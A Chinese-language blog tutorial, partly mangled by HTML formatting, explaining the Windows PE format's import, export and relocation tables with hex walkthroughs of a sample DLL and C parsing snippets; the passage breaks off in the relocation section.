-<p>typedef struct _IMAGE_IMPORT_DESCRIPTOR {<br>    union {<br>        DWORD Characteristics;<br>        DWORD OriginalFirstThunk;            //INT(RBA)<br>    };<br>    DWORD TimeDateStamp;                    //时间戳<br>    DWORD ForwarderChain;<br>    DWORD Name;                                //DllName(RVA)<br>    DWORD FirstThunk;                        //IAT(RVA)<br>} IMAGE_IMPORT_DESCRIPTOR;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;需要我们关心的成员有三个：</div><div class="line"></div><div class="line">* OriginalFirstThunk：一个指向导入名称表(INT)**首地址**的RVA.</div><div class="line">* Name:一个指向隐式映射的dll的名称的RVA</div><div class="line">* FirstThunk:一个指向导入地址表(IAT)**首地址**的RVA</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;OriginalFirstThunk和FirstThunk都是指向一个名为IMAGE_THUNK_DATA的结构体，其中被OriginalFirstThunk指向的是导入名称表(INT)，被FirstThunk指向的是导入地址表(IAT)。而INT和IAT同时都指向一个新的结构IAMGE_IMPORT_BY_NAME。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82e31570e7.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，依照IMAGE_IMPORT_DESCRIPTOR来解析上面我们在文件中获取的IID数据如下。但是这些都是小端序显示的，首先需要转化为大端序，然后在使用上面讲的方法将其转化为文件偏移。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81c4e40fa0.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81df448b5c.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先查看<span class="number">774</span>和<span class="number">7</span>B4对应的DLL名称。</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb81e9677ba3.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后再来查看一下OriginalFirstThunk对应的INT数据，在此之前，我们需要了解一下IMAGE_THUNK_DATA这个数据结构。但是u1是一个共用体，怎么判断IAT中的IMAGE_THUNK_DATA中存储的是Ordinal，还是AddressOfData？**当IMAGE_THUNK_DATA最高位为<span class="number">1</span>的时候，表示序号导入，否则为字符导入，此时保存的是AddressOfData，一个指向IMAGE_IMPORT_BY_NAM的RVA**。一个IMAGE_THUNK_DATA对应一个函数(_IMAGE_IMPORT_BY_NAME)。</div></pre></td></tr></table></figure></p>
-<p>typedef struct _IMAGE_THUNK_DATA<br>{<br>    union<br>    {<br>         PBYTE ForwarderString;<br>         PDWORD Function;     //被导入的函数的入口地址<br>         DWORD Ordinal;       // 该函数的序数<br>         PIMAGE_IMPORT_BY_NAME AddressOfData;   // 一个RVA地址，指向IMAGE_IMPORT_BY_NAME<br>     }u1;<br>} IMAGE_THUNK_DATA32;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在上面，我们了解了IMAGE_THUNK_DAT结构，而且知道了OriginalFirstThunk指向的是IMAGE_THUNK_DAT(INT)。所以，在文件偏移<span class="number">68</span>Ch处，找到数据<span class="number">10210000</span>，同样的，我们将它转化端序和文件偏移得到<span class="number">10210000</span>---&gt;<span class="number">2110</span>---&gt;<span class="number">710</span>。在<span class="number">710</span>处，我们应该可以得到IMAGE_IMPORT_BY_NAME这个结构体。现在，我们需要了解一下这个结构体的形式.</div></pre></td></tr></table></figure></p>
-<p>typedef struct _IMAGE_IMPORT_BY_NAME {<br>     WORD    Hint;       //函数需序号<br>     BYTE    Name[1];    //函数名称<br> } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;了解完IMAGE_IMPORT_BY_NAME这个结构体，在文件<span class="number">710</span>H处查看IMAGE_IMPORT_BY_NAME</div><div class="line">     ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb8264224925.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于IID是一个双桥结构，刚刚我们通过OriginalFirstThunk间接通过IAT寻找到了IMAGE_IMPORT_BY_NAME。接下来使用FirstThunk寻找IMAGE_IMPORT_BY_NAME。可以发现两处都是指向同一个地址，而且这个地址就是IMAGE_IMPORT_BY_NAME</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/18/5cb82826e90dc.png)</span></div><div class="line"></div><div class="line"><span class="meta">## 0x1.3 导入表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;编程实现文件中导入表获取，首先利用ReadFile函数将对象PE文件读入内存,这里可以使用多种方法读取。</div></pre></td></tr></table></figure></p>
-<p>if (!ReadFile(hFile, lpBaseAddress, dwFileSize, &amp;dwNumberOfBytesRead, NULL))<br>{<br>    printf(“ReadFile:%d\n”, GetLastError());<br>    return FALSE;<br>}<br>PrintImportTable(lpBaseAddress);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;然后在数据目录第二项获取导入表的RVA。但是需要注意的是，必须加上文件在内存中的基地址，这样才是IID的地址。</div></pre></td></tr></table></figure></p>
-<p>//获取导入表地址<br>DWORD Rav_Import_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>PIMAGE_IMPORT_DESCRIPTOR ImportTable = PIMAGE_IMPORT_DESCRIPTOR((ULONG_PTR)lpBaseAddress + Rav_Import_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来是遍历IMAGE_IMPORT_DESCRIPTOR，因为IMAGE_IMPORT_DESCRIPTOR个数是和隐式链接的dll数一致的，但是，IID结束的标志为全<span class="number">0</span>。所以只需要比较从第一个IID开始，如果有sizeof(IMAGE_IMPORT_DESCRIPTOR)个<span class="number">0</span>的话，说明IID遍历结束</div></pre></td></tr></table></figure></p>
-<p>for (i = 0; memcmp(ImportTable + i, &amp;null_iid, sizeof(null_iid)); i++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;打印DLLNAME，利用IMAGE_IMPORT_DIRECTORY-&gt;Name打印DllName。同上，需要加上基地址</div></pre></td></tr></table></figure></p>
-<p>DllName = (LPCSTR)((ULONG_PTR)lpBaseAddress + ImportTable-&gt;Name);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;获取OriginalFirstThunk。和IID一样的原理遍历INT。</div></pre></td></tr></table></figure></p>
-<p>PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((ULONG_PTR)lpBaseAddress + ImportTable[i].OriginalFirstThunk);<br>//遍历同一个IID下的OriginalFirstThunk<br>for (j = 0; memcmp(pThunk + j, &amp;null_thunk, sizeof(PIMAGE_THUNK_DATA)); j++){}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;之前说过根据OriginalFirstThunk高位是否为<span class="number">1</span>判断导入方式，如果高位为<span class="number">1</span>,使用序号的方式导入，否则按照函数名称导入</div></pre></td></tr></table></figure></p>
-<p>if (pThunk[j].u1.AddressOfData&amp;IMAGE_ORDINAL_FLAG)   //按标号导入<br>{<br>    //<br>}<br>else   //按名称导入<br>{<br>    //<br>}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta"># 0x2 导出表</span></div><div class="line"><span class="meta">## 0x2.1 导出表的作用</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;我们都知道DLL是实现代码复用的重要方式，同时为了让调用DLL的PE文件(包括exe和dll)知道哪些函数是可以被复用的，所以dll会将可以被导出的函数的RVA值保存在导出表中。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表事实上并不只是存在于DLL中，同时也可能存在于exe中。当一个PE文件被装载的时候，装载器会将PE文件中所有被登记的DLL一起载入，然后根据DLL的导出表对导入表中的IAT进行修正。</div><div class="line"></div><div class="line"><span class="meta">## 0x2.2 导出表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;导出表描述信息位于可选头的数据目录中的第一项。<span class="number">4000</span>是导出表的RVA值，需要转化为FOA值。利用导入表的公式`section[i].PointOfRawData+(RVA-VirtuallAddress)`进行计算，得到FOA为C00.</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd8cd14763.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbd9b42b0b9.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候，我们在文件中的C00处就可以找到我们导出目录了。我们现在需要了解一下导出目录`IMPORT_EXPORT_DIRECTORY`这个结构.其中我们需要重点关心的成员有以下几个。</div><div class="line"></div><div class="line">* Name:导出函数的文件名RVA</div><div class="line">* Base:导出函数起始需要，在导出函数序号表中的值，需要加上此值才是导出函数真正的序号</div><div class="line">* NumberOfFunctions：导出函数个数</div><div class="line">* NumberOfNames：名称导出函数个数</div><div class="line">* AddressOfFunctions;        <span class="comment">//指向到处函数地址表的RVA</span></div><div class="line">* AddressOfNames;            <span class="comment">//指向函数名地址表的AVA</span></div><div class="line">* AddressOfNameOrdinals;     <span class="comment">//指向函数名序号表的RVA</span></div></pre></td></tr></table></figure></p>
-<p>typedef struct _IMAGE_EXPORT_DIRECTORY {<br>    DWORD Characteristics;<br>    DWORD TimeDateStamp;            //输出表的创建时间<br>    WORD MajorVersion;                      //输出表的主版本号。未使用设置为0<br>    WORD MinorVersion;                      //输出表的次版本号。未使用设置为0<br>    DWORD Name;                //指向一个与输出函数关联的文件名的RVA<br>    DWORD Base;                //导出函数的起始序号<br>    DWORD NumberOfFunctions;        //导出函数的总数<br>    DWORD NumberOfNames;            //以名称导出的函数总数<br>    DWORD AddressOfFunctions;        //指向到处函数地址表的RVA<br>    DWORD AddressOfNames;            //指向函数名地址表的AVA<br>    DWORD AddressOfNameOrdinals;            //指向函数名序号表的RVA<br>} IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如下图是导出表的数据。可以看到`<span class="number">32</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span>`对应的是Name这个成员变量的RVA，我们调整端序，计算FOA(<span class="number">32400000</span>---&gt;<span class="number">00004032</span>---&gt;C32)可到Name在文件中的位置是C32.正好指向DllDemo.dll这个字符串。根据上述方法解析导出表数据如下</div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbdd659be05.png)</span></div><div class="line"></div><div class="line">* Name：[C06]=C32--&gt;<span class="string">"DllDemo.dll"</span>  (rva)</div><div class="line">* Base：[C10]=<span class="string">"00000001"</span></div><div class="line">* NumberOfFunctions:[C14]=<span class="string">"00000001"</span></div><div class="line">* NumberOfNames:[C18]=<span class="string">"00000001"</span></div><div class="line">* AddressOfFunctions:[C1C]=C28---&gt;<span class="number">08100000</span> (RVA)</div><div class="line">* AddressOfNames:[C20]=C2C---&gt;<span class="string">"MsgBox"</span>     (RVA)</div><div class="line">* AddressOfNameOrdinals[C24]=C30---&gt;<span class="number">0000</span>   (RVA) </div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;【重点】PE装载器调用GetProcAddress来填充IAT，这时候需要了解GetProcAddress原理。</div><div class="line"></div><div class="line">* 定位到IMAGE_EXPORT_DIRECTORY结构</div><div class="line">* 判断Name是否是传入的DllName</div><div class="line">* 获取ENT数组的起始地址，寻找FuncName，如果找到记录在ENT的数组索引。</div><div class="line">* 然后读取导出函数序号数据的第一项的序号值</div><div class="line">* 使用Base+序号的值到EAT中寻找地址</div><div class="line"></div><div class="line"><span class="meta">## 0x2.3 导出表编程</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;首先需要在数据目录中获取导出表地址，需要注意的是这个地址是个RVA的值，需要加上BaseAddress。</div></pre></td></tr></table></figure></p>
-<p>DWORD Rav_Export_Table = pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>PIMAGE_EXPORT_DIRECTORY ExportTable = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)lpBaseAddress + Rav_Export_Table);<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;由于`AddressOfNames`,`AddressOfFunctions`,和`AddressOfNameOrdinals`都是RVA值，且都需要进程RVA-&gt;FOA的转化。所以如果要获取这三个成员变量的FOA的话需要进行两部，第一将RVA转化为FOA，然后加上BaseAddress。</div></pre></td></tr></table></figure></p>
-<p>//获取导出函数名数组<br>DWORD<em> dwAddressOfNames =(DWORD</em>)((ULONG_PTR)lpBaseAddress+ RvaToOffset(ExportTable-&gt;AddressOfNames,lpBaseAddress));<br>//获取导出函数数组<br>DWORD<em> dwAddressOfFunctions = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfFunctions, lpBaseAddress));<br>//获取导出函数索引数组<br>DWORD<em> dwAddressOfNameOrdinals = (DWORD</em>)((ULONG_PTR)lpBaseAddress + RvaToOffset(ExportTable-&gt;AddressOfNameOrdinals, lpBaseAddress));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;因为NumberOfFunctions&gt;=NumberOfNames,适合放在外部循环进行比较。</div></pre></td></tr></table></figure></p>
-<p>for (i = 0; i &lt; dwNumberOfFunctions; i++){…}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;在提到关于GetProcAddress用法时说道，如果目标函数在AddressOfFuns被找到记录其数组索引。然后在导出函数序号数组中寻找对应序号。</div></pre></td></tr></table></figure></p>
-<p>if (<em>(WORD</em>)(dwAddressOfNameOrdinals + j * sizeof(WORD)) == i)<br>{}<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接着取出我们的需要序号，以及在导出函数地址数组对应的序号所对应的导出函数地址</div></pre></td></tr></table></figure></p>
-<p>//函数名称<br>FunName = (LPCSTR)((ULONG_PTR)lpBaseAddress + dwAddressOfNames[j <em> sizeof(WORD)]);  //VA值<br>//函数索引<br>FunOrdinal = </em>(WORD<em>)(dwAddressOfNameOrdinals + j </em> sizeof(WORD));<br>//函数地址   i=(dwAddressOfNameOrdinals + j <em> sizeof(WORD))   其实是索引值<br>//这里需要取其值，注意</em>(DWORD<em>)<br>FunAddress = </em>(DWORD<em>)(dwAddressOfFunctions + FunOrdinal </em> sizeof(DWORD));<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbed6a89dd0.png)</span></div><div class="line"></div><div class="line"><span class="meta"># 0x3 重定位表</span></div><div class="line"><span class="meta">## 0x3.1 重定位原理</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;PE装载的时候，大多选用相对地址RVA，这样做的原因有二，第一是为了方便装载器，二是为了重定位。那么什么时候需要重定位呢，或者说重定位的条件是什么呢，我们应该知道每个进程内存是相互独立的，也就是说exe文件发生重定位的可能性不高，这样看来由于DLL的装载位置的不同，DLL文件发生重定位的可能性就比较高了，因为同一个进程空间里面可能存在多个DLL文件，有时候多个dll设定的原始的基地址是相同的，但是对于操作系统来说这是不允许存在的，所以需要对他们进行重定位。</div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;这时候就需要将那些需要被重定位的数据保存在一张表里面，然后取出里面的地址，利用某一个特定的公式，重新计算加载地址即可。</div><div class="line"></div><div class="line"><span class="meta">## 0x3.2 重定位表结构</span></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;重定位表位于数据目录项中第<span class="number">6</span>项，通过上述的方法可以定位到文件中重定位表地址为<span class="number">0xE00</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbbf1da6e887.png)</span></div><div class="line">    ![](https:<span class="comment">//i.loli.net/2019/04/21/5cbc0fe5b5fcd.png)</span></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;接下来，我们开始解析重定位表，在解析之前，需要了解重定位表结构。重定位表是由多个IMAGE_BASE_RELOCATION结构体构成的。有三个成员变量</div></pre></td></tr></table></figure></p>
-<p>typedef struct _IMAGE_BASE_RELOCATION {<br>    DWORD   VirtualAddress;//RVA<br>    DWORD   SizeOfBlock;   //重定位数据大小<br>    WORD    TypeOffset;    // 重定位项数组<br>} IMAGE_BASE_RELOCATION,* PIMAGE_BASE_RELOCATION;<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">* VirtualAddress是重定位数组的RVA，**但是需要每个重定位数组地址加上这个RVA才是真正的重定位数组的地址**</div><div class="line">* SizeofBlock：重定位结构大小</div><div class="line">* TypeOffset：两个字节，<span class="number">16</span>位，高<span class="number">4</span>位表示重定位类型，低<span class="number">12</span>位表示重定位地址</div><div class="line"></div><div class="line"></div><div class="line"><span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;<span class="variable">&amp;nbsp</span>;如图所有，解析如下：</div><div class="line"></div><div class="line">* VirtualAddress：<span class="number">00001000</span></div><div class="line">* sizeofBlock：<span class="number">10</span>H--&gt;(<span class="number">10</span>H<span class="number">-8</span>H)/<span class="number">2</span>=<span class="number">4</span>,一共有四个重定位数组，<span class="number">8</span>H指的是VirtualAddress和sizeofBlock所占的字节数为<span class="number">8</span>，除以<span class="number">2</span>H，表示一个TypeOffset为<span class="number">2</span>个字节。</div><div class="line">* Data1:<span class="number">0F</span>30--&gt;<span class="number">300F</span>--&gt;Type:<span class="number">3</span>--&gt;Addr:<span 